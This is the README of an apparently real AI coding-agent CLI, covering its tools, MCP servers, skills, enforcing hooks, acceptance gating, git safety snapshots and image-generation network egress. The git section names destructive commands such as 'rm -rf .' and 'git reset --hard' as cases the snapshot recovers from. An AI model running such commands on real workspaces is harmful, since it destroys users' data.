| `pipe_to_asset` | **Generate the asset *and* write the code that uses it, in one call.** It drops the image at the path you name and replaces a unique marker in a source file with the reference to it. The reason it exists is that `generate_image` returns `.png` *or* `.jpg` depending on which engine answered, so a reference written before the render is a guess that is wrong every time the free fallback serves you — and the page then loads nothing, silently. The reference defaults to a path relative to the file being edited; pass `reference: "/img/{file}"` when assets are served from a URL root. If the marker is missing or appears twice it **refuses and generates nothing** — it never asks you which one you meant, because `--max-questions 0` and unattended runs are real and a verb that needs an answer is broken in both. Same engine, same per-run image cap, same credits as `generate_image`. | multi-round runs, wherever `generate_image` is offered |
| `plan_start` · `plan_step` · `plan_status` | A visible plan with a **round countdown**. Every later round carries `plan: 1/3 done · 2 remaining: … · round 4 of 5`, so the model can see the wall it is driving at instead of spending its last round the way it spent its first. | always |
| `declare_acceptance` · `check_acceptance` | Name the command that decides whether the job is done, and run it. A **declared** criterion sets the exit code — see below. | withheld by `--no-run`, because `check_acceptance` executes commands |
| `list_sessions` | Lets the model see that an earlier run already attempted this. Read-only; resuming is an operator action, from the command line. | always |
| `read_skill` | Opens one of *your* procedures — see below. | only when `.acuvo/skills/` holds at least one skill |
| `delegate` | Hands a **read-only** research question to a helper with its own fresh context — "where is X defined", "which files call Y" — and gets back a short summary instead of everything it read. The helper is offered twelve tools, all of them reads (`SUBAGENT_TOOL_NAMES`, `lib/subagent.mjs`); it cannot write, edit, commit or run anything, it is capped at 6 rounds (4 by default), and **it cannot delegate again** (`MAX_SUBAGENT_DEPTH` = 1 — two levels is how a five-round task becomes a hundred model calls nobody authorised). | always, when model credentials reached the dispatcher — it is the one tool that spends a completion of its own, and it refuses rather than guessing a config |
| `remember` · `forget` | Facts that outlive the run. `remember` writes one markdown file per fact into `.acuvo/memory/`; the next run reads them back into the prompt, so it does not rediscover your real test command. `forget` deletes one, because a wrong memory is worse than no memory. Bounded at 40 entries / 4,000 bytes / 400 characters a fact, oldest evicted; every fact must carry a `why`, and anything that pattern-matches a credential is refused outright — *"these files are committed to the repo, so nothing secret can go in one"*. | always |
| `find_definition` · `find_references` · `check_types` · `list_symbols` | Real semantic navigation through a language server (typescript-language-server, pyright, rust-analyzer, gopls). | only when a server is installed **and** this project contains that language |
| `inspect_binary` | **What `file`, `xxd`, `od` and `strings` do, in-process.** Identifies the file by its magic bytes and decodes the header of an ELF, PE, Mach-O or SQLite file — including the ELF **program header table**, which is the thing our own bench transcripts show a model reconstructing by hand out of an `od` dump over five rounds. `mode:"hex"` dumps any byte range in `xxd`'s layout; `mode:"strings"` lists printable runs **with their offsets**. ⚠️ Measured across 139 recorded runs: `file: not found` **11 times** and `xxd: not found` **7 more**, in 18 runs that reached for binary forensics 57 times — and those runs all had a shell. On the default surface there is no `file`, no `xxd` and no `od` at all, so the question was unaskable rather than merely unanswered. | multi-round runs, **only where the workspace actually contains a binary** — its schema is 1,071 B and the offer had 487 B of headroom, so an unconditional offer would have crossed a deliberate ceiling |

⭐ **The two gates are the point, not a limitation.** A control that presents itself and
does nothing is worse than one that is absent: a model offered `check_types` on a machine
with no language server learns to try, wait and apologise. Measured while integrating
this: a zero-dependency JavaScript package was offering all four LSP tools because
`rust-analyzer` happened to be on the developer's `PATH` from unrelated work — installed,
useless here, and four dead buttons. The gate is now the intersection of *installed* and
*spoken by this project*.

### Integrations — MCP, and the curated set

The 88 tools above are the ones we built, and that is a real ceiling: work that lives in
your database, your issue tracker or your browser needs an adapter nobody is going to
write. **Model Context Protocol** is the escape — an MCP server is just a process, so
breadth here is nearly free.

⭐ **Which is exactly why access is not the edge — curation is.** Every agent in this
category speaks MCP and hands you an empty config file. What is scarce is a short list
somebody actually ran. `acuvo --doctor` prints ours, live, in the **MCP SERVERS** section:
what you have configured, then what you could have, with the reason each one is off and
the exact line that turns it on.

```
MCP SERVERS
  live    curated servers   14 of 18 servers we have run ourselves are usable here
                            (acuvo, browser, docs, playwright, deepwiki, grep, mslearn,
                            awsdocs, cloudflare, huggingface, svelte, astro, convex, clerk)
                            — 21 in the catalogue in total
  live    browser           Drive a real Chrome: click, fill forms, type, navigate …
  live    docs              Look up current, version-specific documentation …
  dark    filesystem        @modelcontextprotocol/server-filesystem is not installed …
                            → npm i -g @modelcontextprotocol/server-filesystem
```

The two worth knowing about, because they cover what this CLI structurally cannot do:

| server | what it adds | install |
|---|---|---|
| **`browser`** (Chrome DevTools MCP) | The one thing nothing here can do: **click, fill a form, type, drive a flow.** `see_page` renders and measures a page; it cannot press a button. Drives the Chrome already on your machine — no browser download. Verified: 29 tools, connected in 2.9s, navigated and read the accessibility tree back. | `npm i -g chrome-devtools-mcp` |
| **`docs`** (Context7) | **Current, version-specific library documentation** as source-cited snippets rather than search results — the fix for a model confidently quoting an API that changed two majors ago. Verified: 2 tools, real answers, **no API key**. | `npm i -g @upstash/context7-mcp` |

Then add it to `.acuvo/mcp.json` under `"mcpServers"`. `playwright` is also verified (24
tools) if you need Firefox or WebKit — ⚠️ note it writes `.playwright-mcp/` into your
working directory unless you pass `--output-dir`.

> ⚠️ **Nothing is enabled for you, and that is arithmetic rather than caution.** A server
> that cannot start still costs the **full 20-second handshake timeout** — measured at
> 20,052ms — before your first prompt. Anything needing a download or a credential is
> therefore off by default: this client passes npx `--no`, so it can only run a package
> that is *already installed*, and it can never fetch one for you.
>
> ⚠️ **The canonical install line from every MCP README does not work here, by design.**
> `{"command":"npx","args":["-y","@playwright/mcp@latest"]}` becomes `npx --no
> @playwright/mcp@latest` — `-y` is stripped and `--no` injected so a config file can
> never trigger a download-and-execute. Install the package globally first, and drop the
> `@latest` tag. The catalogue's entries are already written in the form that works.
>
> ⚠️ **The user chooses the servers, never the model.** There is deliberately no
> `connect_mcp_server` tool — a model that can add its own capabilities can grant itself
> anything on the machine. And a server you configure runs with your environment: we do
> not sandbox it and do not claim to. Read `ENTERPRISE.md` §3.1 before committing an
> `mcp.json`, because a committed one in a repo you cloned is spawned on an ordinary run.
>
> ⚠️ **`docs` is a network service** — your query text goes to Upstash. Named here because
> it is an egress path a reviewer will want to know about, like `generate_image` below.

### Skills — your procedures, no pull request needed

Write a markdown file in `.acuvo/skills/`:

```markdown
---
name: new-endpoint
description: how this project adds an HTTP endpoint
when: adding any new route or endpoint
---

1. Every endpoint file goes in `routes/`, named `<verb>-<noun>.js`.
2. Every endpoint must export a function called `handle`.
3. Every file must start with `// OWNER: platform-team`.
```

The catalogue (name, description, when) goes into the system prompt; the **body** is only
loaded when the model calls `read_skill`, so twenty skills cost you three lines of prompt
rather than twenty documents.

Measured, 2026-08-11, with exactly the skill above and the task
`"add an endpoint that returns the current health status"` — nothing about skills in the
prompt the user typed: the model called `read_skill` as its **first** tool and wrote
`routes/get-health.js`, exporting `handle`, beginning with `// OWNER: platform-team`.

⚠️ **A skill is notes, not permissions.** It cannot grant a tool, lift a restriction or
override a safety rule, and both the catalogue and the loaded body say so — a skill file
is prose sitting in a repository, so it is treated as untrusted text.

### Hooks — your rules, *enforced*, not requested

Everything above is a policy the agent is asked to follow. `.acuvo/hooks.json` is one it
cannot decline: shell commands wired around the tool loop, and **a `PreToolUse` hook that
exits non-zero BLOCKS the tool call**. The refusal is handed back to the model as an
ordinary failed tool result, carrying whatever your hook printed — so it reads the reason
and adapts, the same way it reads any other refusal.

```json
{
  "hooks": [
    { "event": "PreToolUse",  "tools": ["write_file", "edit_file"],
      "command": "node .acuvo/guard.mjs" },
    { "event": "PostToolUse", "tools": ["write_file"],
      "command": "npx prettier --write \"$ACUVO_TOOL_ARG_PATH\"" },
    { "event": "Stop", "command": "notify-send 'acuvo finished'" }
  ]
}
```

Three events — `PreToolUse` (can refuse), `PostToolUse` (cannot: the file is already
written), `Stop` (the session ended). So "never touch `infra/`", "format everything it
writes", "lint after each edit and tell the model what broke" and "ping me when it
finishes" are all four lines of JSON.

- **The hook is told what happened, in environment variables a plain `sh` can use** —
  `ACUVO_HOOK_EVENT`, `ACUVO_TOOL_NAME`, `ACUVO_TOOL_ARGS` (the whole JSON blob) and a
  scalar per scalar argument, e.g. `ACUVO_TOOL_ARG_PATH`. Neither `sh` nor `cmd` has a
  JSON parser and requiring `jq` would make the feature unusable on most of the machines
  it is for. Object and array arguments get **no** scalar, because
  `ACUVO_TOOL_ARG_HEADERS='[object Object]'` is a string that looks like data and is not.
- **Matching is exact tool names plus `*`, deliberately not a regex** — an exact name can
  be checked against the real tool list, so `"PreToolCall"` or `"write_fil"` is an error
  that quotes your typo back rather than a matcher that silently matches nothing.
- **Bounded**: 30s per hook, a 120s ceiling (a longer one is *refused*, not clamped —
  silently clamping would leave you believing a ten-minute hook is configured), at most 32
  hooks, and a 4,000-character cap per environment value so a `write_file` body cannot
  blow the kernel's `execve` limit. Every truncation is marked.
- ⚠️ **A hook that cannot run is treated as a hook that said no.** A gate that could not
  answer has not said yes.

### Acceptance — make the verdict be about the command *you* named

`✔ VERIFIED` means *a* command exited 0. That is not the same as "the thing you asked for
passed", and the gap is where a green tick about the wrong command lives.

- A **declared** criterion (`declare_acceptance`, or `.acuvo/acceptance.json`) **decides
  the exit code.** If it is unmet, the process exits 1 and `--json` reports
  `failed: true`. If nothing in the run satisfied it, it is run once at the end, free —
  no model call.
- A **derived** criterion — read out of your own task text, e.g. `"it must pass: npm
  test"` — is **reported and never gates.** This runner guessed it out of prose, and a
  guess must not be able to fail a run that did the right thing under a different name
  (`npm test` vs `npm run test`).

`--json` says which you got:

```json
"acceptance": { "source": "declared", "gating": true, "verdict": "unmet",
                "unmet": [{ "command": "npm test", "why": "it ran and exited 1" }] }
```

⚠️ **Read `.acceptance` as well as `.verification`.** A run can verify one command and
miss the one you named; `verification.passed` will be `true` and `acceptance.verdict` will
be `unmet`. The exit code follows the declared criterion, so `acuvo --json … && git push`
is safe *if the criterion was declared*.

### `.acuvo/` — what the CLI writes into your workspace

It is one directory in **your** repository, and it holds two different kinds of thing.

| path | what it is | commit it? |
|---|---|---|
| `.acuvo/sessions/` | Resumable runs, newest 20 kept. What `--sessions`, `--resume` and `--replay` read. | **no** — machine-local, and large |
| `.acuvo/audit/<date>.jsonl` | One redacted line per invocation: what was asked, what changed, what verified, what it cost. Never file contents, command output or model prose. | **your call.** Ignore it by default; commit it deliberately if the record is the point |
| `.acuvo/plan.json`, `.acuvo/acceptance.json` | The agent's own bookkeeping for the run in progress. | no |
| `.acuvo/steer.txt` | An instruction you write WHILE it works — see below. Read and deleted at the next round boundary. | no |
| `.acuvo/skills/*.md` | *Your* procedures — see above. | **yes** |
| `.acuvo/memory/*.md` | Facts `remember` recorded, one file each. Markdown on purpose: diffable, reviewable in a PR, and the reason a credential is refused before it can be written. | **yes** |
| `.acuvo/commands.json` | Which command presets this project enables — see below. | **yes** |
| `.acuvo/mcp.json` | MCP servers to connect to (`.mcp.json` at the root is also read, second). Written by you; no tool can add one. | yes, if your team shares them — and read `ENTERPRISE.md` §3.1 first, because a *committed* one in a repo you cloned is spawned on an ordinary run |

⚠️ So the ignore rule is **not** a blanket `.acuvo/` — that would throw away the three
things that are meant to travel with the repo. Use this instead:

```gitignore
.acuvo/*
!.acuvo/skills/
!.acuvo/memory/
!.acuvo/commands.json
```

`--no-session` and `--no-audit` opt out of the two records; `--dry-run` writes neither.

### Steering it mid-run — `.acuvo/steer.txt`

A run is not a thing you can only watch or kill. Write a line into `.acuvo/steer.txt` from
anywhere — another terminal, your editor, a script — and the run picks it up at the **next round
boundary**, appends it to the conversation as something *you* said, and carries on from the same
transcript. Nothing already done is thrown away.

```bash
echo "stop writing tests, just fix the import" > .acuvo/steer.txt
```

What you see, from a real run:

```
  ⚠ stopped after round 8 — you steered the run mid-flight
  ⤳ steering: "stop writing tests, just fix the import" — applied now, 2 rounds left · $0.002161 spent so far

── round 1/2 ─────────────────────────────
  The user changed direction: I will keep only the circle function …
```

- **It is a file, not a keystroke,** because interactive mode gives stdin to `readline` and one-shot
  mode — the long case, the one that needs it — has no keyboard in the loop at all. A file works in
  both, and can be written by something that is not a person.
- **Read once, then deleted.** An instruction you gave once must not become one you cannot stop giving.
- **The rounds are not refilled.** The continuation gets what was left of `--max-rounds`, and the
  `--budget` ceiling covers the whole turn, not each segment of it.
- **Bounded** to 3 steers per turn, and a steer that could not be applied says so rather than vanishing.

### Stopping it — Ctrl-C

The **first** press stops the run at the end of the round in flight: the transcript is saved, the cost
is recorded, the changes are reported, and `acuvo --resume` carries on. The **second** press quits
immediately. Either way the exit code is **130** (128+SIGINT), never `1` — `1` means "the code it
wrote still does not pass", and a script that cannot tell those apart retries the wrong one.

---

## What it sends before it starts

Every fresh task begins with a **repo map**: the directory tree plus the exported symbols of
the source files, bounded to about 9,000 tokens (`DEFAULT_BUDGET_TOKENS`, `lib/repo-map.mjs` — it
was 6,000 until the map was measured seeing 1.9% of a large repo's directories),
and byte-stable so the prompt prefix caches. Files that do not fit are named as a count per
directory, with a pointer to `find_files` / `search_text` — omitted, never silently absent.

⚠️ **This replaced an older pre-read that had two real defects**, and both are fixed rather
than mitigated:

- It walked only **two levels** and read the *contents* of every small file it found. A module
  four directories down was invisible, so the model would invent a plausible file and write
  over the wrong one.
- It sent the **body of gitignored files** to the provider. The map lists a path when the tree
  shows one and never reads an ignored file's contents. `.env`, `*.pem`, `id_rsa` and other
  credential-shaped files are withheld entirely and reported as a count.

If a workspace cannot be read, the map is simply empty and the task proceeds — a pre-read is
an optimisation, not a precondition, and it may never be the thing that kills a run.

---

## Git

Git is exposed as **structured verbs**, not as a command string: `git_status`, `git_diff`,
`git_log`, `git_commit`, `git_branch`, `git_worktree`, and `git_push` (opt-in, `ACUVO_ALLOW_PUSH=1`).

`reset`, `checkout`, `clean`, `stash`, `rebase` and `merge` are not refused — they are
**inexpressible**. There is no path from a model-authored string to a git subcommand it was not given.

Three deliberate restrictions:

- **Commit requires you to name the paths.** There is no "commit everything": sweeping up files nobody looked at is how scratch files and secrets get committed.
- `.env`, `*.pem`, `id_rsa` and friends are **never** staged, whatever `.gitignore` says. History keeps a secret after you delete it.
- **`git_worktree remove` refuses while a worktree still holds work**, and the model has no `force` parameter to pass. Automatic cleanup only ever removes a worktree that is unchanged and whose HEAD has not moved.

⚠️ If your workspace sits *inside* a larger repository, the **write** verbs are refused — a commit,
a branch or a push is repository-wide and would act on the whole outer project. `git_status`,
`git_diff` and `git_log` still work; they scope themselves to the workspace directory.

### The snapshot behind every command

Before **every** `run_command`, the working tree is committed to a hidden ref under
`refs/acuvo/safety/`, so anything a command destroys is recoverable — including untracked files,
which no other mechanism in git protects.

It is not a pattern list. Nothing inspects the command first, so `git reset --hard`, `rm -rf .` and
a script that calls `fs.rmSync` are covered identically. It never refuses and never blocks: a
failure to snapshot is silent, because a safety net that stops the trapeze gets switched off.

- It is **cheap**: the temp index is seeded from `.git/index`, which took a full snapshot of a
  20k-file monorepo from 79.4s to 0.70s. An unchanged tree writes nothing at all.
- It **never stages anything for you** — `GIT_INDEX_FILE` points `git add` at a copy, and
  `.git/index` is byte-identical afterwards.
- Snapshots live outside `refs/heads`, so `git branch`, `git push` and every GUI ignore them.
  `git log refs/acuvo/safety/…` is how you read one back.
- Switch it off with `ACUVO_GIT_SAFETY=0` — an environment variable, which is a door the agent
  has no verb that reaches.

---

## Media tools

Four of these are **only offered when you configure their endpoint**. A tool whose service is absent is never mentioned, so the agent cannot waste a round discovering it does not work.

| tool | env | what it does |
|---|---|---|
| `see_page` | `RENDER_AUDIT_URL` | Render your HTML in a real browser; save the screenshot, report measured layout problems. |
| `speak` | `MODAL_TTS_URL` | Text → an audio file in your workspace. |
| `transcribe` | `MODAL_TRANSCRIBE_URL` | Audio/video → text with timestamped segments. |
| `make_document` | `MODAL_PRESS_URL` | HTML → PDF, PNG or PPTX. |
| *(all four)* | `MODAL_VIDEO_SECRET` | The shared secret those endpoints expect. |

> ⚠️ **`MODAL_VIDEO_SECRET` is the one that costs the most time, and it used to be
> documented nowhere.** It is not a URL, so it never appears in an error about a missing
> endpoint — a correctly-set URL *without* it fails authorisation and reads like a broken
> service. Its absence is what made four working tools look broken. `acuvo --doctor` now
> distinguishes the three states explicitly: **live** (reachable *and* authorised),
> **dark** (unset — the tool is simply never offered), **broken** (set, and not answering).

### `--design <file.html>` — the design loop, without the agent

```bash
acuvo --design index.html
```

Renders the page, looks at it, and prints a verdict. No model call, no completion spent.
Real output, on a page written for this README:

```
LOOKED AT index.html — 1280×900
1. unreadable text (contrast 1.71:1, needs 4.5): Zero dependencies. One file. It runs what it writes.
2. the page scrolls sideways: content is 2590px wide in a 1280px viewport
  screenshot: .acuvo/render-2016419880418.png (19KB)
```

Exit 0 when the page was looked at and nothing was found; 1 when the look failed **or** the
page has findings. On a terminal that speaks kitty or iTerm2 the actual pixels are drawn
inline — the path line stays either way, because the image is an addition to the report and
never a replacement for it.

⚠️ **"Could not look" is never reported as "the page is fine."** With `RENDER_AUDIT_URL`
unset it names that variable and makes no claim about the page. The JSON form carries the
same distinction in a field (`trustworthy`), so a script cannot mistake one for the other.

⭐ The same verdict is what the *agent* now reads when it calls `see_page`. Measured: the
verdict is **26 tokens** where the raw tool record was **205** and the screenshot itself
would be **1,536**. Anyone can take the photograph; the compression is the product.

### Voice — `--task-audio` in, `--say` out

```bash
acuvo --task-audio note.wav          # transcribe a file and run what it says
acuvo --say "fix the failing test"   # speak the verdict when the run ends
```

⚠️ **It shows you the transcript and waits.** Enter cancels, `y` runs it, and anything else
is treated as a correction — `"no, the server not the sensor"` fixes a mis-heard word
without retyping the task. That keystroke is the whole thing standing between a mis-heard
word and a file-writing agent, so there is no way to skip it except `--yes`, which is
required in a pipe, in CI, or with `--json` (where there is nobody to ask).

A full round trip, run 2026-08-11: `--say` wrote a 424KB `.wav`, that file was fed back in
with `--task-audio`, and the transcript came back as *"Create a file called Greeting.Text
containing the word working."* — which, confirmed with `--yes`, the agent then did.

```
  heard in ask.wav:

    "Create a file called Greeting.Text containing the word working."

  run it? [y = yes · Enter = no · or type a correction]
```

**It does not record and it does not play.** `--task-audio` needs a file that already
exists; `--say` writes a `.wav` and prints the one command that plays it on your OS. Both
are deliberate: live capture and audio playback each mean an npm dependency or an OS binary
past the command allowlist, and zero dependencies is the point of this package.

⚠️ `--parallel` is **not** narrated. N verdicts read aloud in a random order is noise.

### The horizon: the history is compacted, and it says so

There is no flag for this. As a conversation approaches a 24,000-token budget the loop
compacts it **before** it pays for the next call — clamping and stubbing old tool results,
never removing messages — and prints what it freed. Real output, from a 15-round session
run 2026-08-11 (rounds 12, 13 and 14 each compacted):

```
── round 13/16 ─────────────────────────────
  · 25,206 → 23,287 estimated tokens (7.6% freed, ~1,919 tokens) across 3 of 12 tool results.
  ·   giant-results: 3
  ·   under the 24,000 token budget.
  ·   ⚠️ every token number here is an ESTIMATE — characters divided by 4 …
```

⚠️ **Silent compaction is indistinguishable from amnesia**, which is why it is always
announced: without the line, an agent that stops knowing something it read two rounds ago
looks like a defective model. Every token figure is an *estimate* (chars ÷ 4 — counting
properly would mean a dependency) and the printed line says so.

A conversation already under budget is returned **byte-identical** and costs nothing, so
short sessions are unaffected — measured, an 8-round session in the same workspace never
triggered it once.

This is what made `--max-rounds` safe to raise from a ceiling of 8 to **16**, and again to **64** on 2026-08-16: the
constraint was never the round count, it was a transcript that grew without bound. The
15-round session quoted above **could not have existed** under the old ceiling.

⚠️ **Honest limits.** Compaction only ever clamps *tool results*; it does not summarise, so
on a transcript whose weight is model prose rather than file contents it frees little. The
7.6% above is what one real session happened to yield — the saving depends entirely on what
the model did, and no fixed percentage is promised. `underBudget: false` is a real reported
outcome: it does not pretend to have fitted something it could not.

### ⚠️ `generate_image` is different — it is ON by default, and it leaves your machine

Image generation works with **no configuration at all**, because a capability you have to
discover and configure is one most people never see. That convenience has a cost you are
entitled to know about before you run it, so here it is plainly:

**When the agent generates an image, your prompt is sent to a third-party service over the
internet.** By default that is [Perchance](https://perchance.org), reached directly over HTTP/2 —
your prompt goes to them, not to us, and no XXIautomate server is involved. If they do not answer,
the request falls through to [Pollinations](https://pollinations.ai), which also needs no account.
No file contents, no code and no credentials from your workspace are sent to either.

Two things this section used to leave out, both of which you are entitled to know:

**1. The prompt that leaves is not the prompt you wrote.** Every request is rewritten by an art
director before it is sent (`lib/image-director.mjs`): photographic direction — lens, light,
composition, grade — is appended, and *requests for text are actively removed*, because diffusion
models cannot spell and garbled lettering is the defect a viewer reads instantly as "made by a
machine". Ask for "a coffee bag with the label Ember & Oak" and the service is asked for a
composition that needs no label. This makes the output much better and it means the literal string
you typed is not what was transmitted.

**2. The generated image is uploaded to be looked at.** After each attempt the PNG is base64'd
into a vision call on your configured model route (`critiqueImage`, `lib/image-director.mjs`)
which scores it and names its defects. ⚠️ **That is a second egress, to a second party, of a file
that is in your workspace** — worth knowing before you point this at anything confidential. It is
what stops the agent — which cannot see — from confidently referencing a smeared, illegible hero
across four pages, which is a thing that actually happened. **With no credential the critic is
skipped and the result says so** (`accepted: false`, "NOT reviewed") rather than assuming
approval. Up to two attempts, never three.

**Timing, measured end to end 2026-08-11, one real call** (`generateImage`, 512×512, credential
present so the critic ran, default route straight to perchance.org):

```
elapsed 54,829 ms  ·  ok: true  ·  a-sharp-high-resolution-photograph-of-a-.jpg
```

**Fifty-five seconds.** Budget roughly a minute per image, and up to twice that when the critic
rejects the first attempt.

⭐ Timing figures for this tool are quoted end to end, not generation-only — a number that
covers one leg of a call is the number that gets designed against and then missed.

Three ways to control it:

```bash
export PERCHANCE_IMAGE_URL=            # empty = OFF. The tool is never offered.
export PERCHANCE_IMAGE_URL=http://localhost:8080   # point it at your own instance
acuvo --no-run "…"                     # unrelated, but it stops execution entirely
```

Setting it to an **empty string** disables it deliberately and is respected — an unset variable
means "use the default", an empty one means "I have decided not to".

⚠️ **`generate_image` is the exception to "every media tool is gated on its env var"** — it has
a default route and will reach the network without you setting anything. That is stated plainly
because undisclosed network egress from a tool you installed is exactly the kind of thing that
should cost a project its credibility.

---

## Tests

```bash
npm test          # node scripts/test.mjs — no network, no API key
```

**5,780 tests across 396 files**, measured 2026-09-18 (later still — +13 tests in 2 files
for the provider-pin single-source work).
(This README said 455 for long enough that the real number had tripled underneath it, then
said **1,378 across 61 files** for long enough that it had quadrupled again. The count above
is a snapshot, not a constant — run the command and believe the output, not this line.
`test/docs-truth.test.mjs` fails the suite when the FILE count here stops matching what is on
disk, which is the half that only ever moves when somebody adds a file.)

⚠️ **And the command is not a glob.** This line said `node --test test/*.test.mjs`, which is
what `npm test` used to run and is exactly the spelling `scripts/test.mjs` exists to replace:
the glob is expanded by the shell, so on cmd.exe node was handed the literal string, matched
nothing, ran nothing, and **exited 0**. The script enumerates the files itself and asserts the
total.

They cover the safety decisions — path escapes, shell refusal, credential scrubbing,
ambiguous edits, commit guards — the places where being wrong is dangerous rather than merely
broken. `test/docs-truth.test.mjs` additionally fails the suite when this README's documented
defaults stop matching the exported constants.

⚠️ **Read the skip count, not just the fail count.** A suite that is green because a whole
file excused itself is the same lie as a suite that is green because it found no tests, and
the second one is named below.

> ⭐ This paragraph used to report **44 skips in `test/bundle.test.mjs`** — 545 lines of spec
> for a `scripts/bundle.mjs` that did not exist. It exists now, and those tests run.
> ⚠️ It then said the suite skips **2** in total; measured 2026-09-10 it skips **31**, and the
> honest reading is that the number is MACHINE-DEPENDENT rather than drifting: 13 of them are the
> AST and language-server tests, which skip on a checkout with no `typescript` installed and run
> on one that has it. **Never quote a skip count without the machine.** The rule the paragraph
> states is unchanged and still worth obeying.

⭐ **`docs/` WAS ADDED TO THE ALLOWLIST ON 2026-09-17, AND IT HAD NEVER BEEN IN IT.** When the
front door moved its engineering record here on 09-15, the link went with it and the FILE did not:
the README's most prominent link — the one under *"We publish our own limits"* — pointed at a path
`package.json`'s `files` list did not publish. ⚠️ It would have looked fine on npmjs.com, which
rewrites relative README links against `repository`; the reader who got the dead link is the one in
`node_modules`, and `ENTERPRISE.md` invites exactly that reader to audit the package.
`test/the-front-door-links-ship.test.mjs` now checks every relative link on the front door against
the allowlist, and it was red before the one-line fix and green after.

⚠️⚠️ **`npm test` in an INSTALLED copy is a hard red, and this paragraph used to promise the
opposite.** It read: *"a false green … the glob matches nothing, `node --test` finds no tests, and
the command exits 0 having verified precisely nothing."* That was true of the old glob and
`scripts/test.mjs` was written to end it — a missing `test/` now prints *"this copy of acuvo-code
ships no tests, so nothing was verified"* and **exits 1**.

The allowlist ships **261 files** by `npm pack --dry-run`, measured 2026-09-17 — `bin/`, `lib/`,
`skills/`, `scripts/`, `docs/` and five documents, **no `test/`**. `ENTERPRISE.md` gives
the reason (the suite is our working record, and zero dependencies means the shipped source *is* the
audit). **Run the suite from a source checkout.** What an installed copy owes you is a refusal, not
a green, and that is what it gives you.

---

## Licence

**Functional Source License (FSL-1.1-Apache-2.0).** See [LICENSE](./LICENSE) — read it, audit it, run it, self-host it, modify it, build on it. The one thing you may not do is run a commercial service that substitutes for Acuvo Code. Converts to Apache 2.0 after two years.

---

<sub>Acuvo Code is a developer tool built by XXIautomate. **Not affiliated with, endorsed by, or connected to AKUVO, Inc.** or any collections, lending or financial software product.</sub>
